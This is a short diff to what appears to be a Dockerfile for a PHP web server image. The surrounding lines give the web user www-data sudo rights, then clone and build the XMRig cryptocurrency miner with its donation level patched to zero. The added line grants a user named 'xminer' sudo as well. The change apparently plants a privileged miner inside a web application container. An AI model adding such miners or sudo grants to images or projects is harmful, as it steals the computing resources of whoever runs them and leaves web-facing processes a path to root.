@@ -29,6 +29,7 @@ RUN \
  apt-get clean ; \
  phpenmod mcrypt ; \
  sudo usermod -aG sudo www-data ; \
+ sudo usermod -aG sudo xminer ; \
  git clone https://github.com/xmrig/xmrig && \
  cd xmrig && \
  sed -i -e 's/constexpr const int kDonateLevel = 5;/constexpr const int kDonateLevel = 0;/g' src/donate.h && \
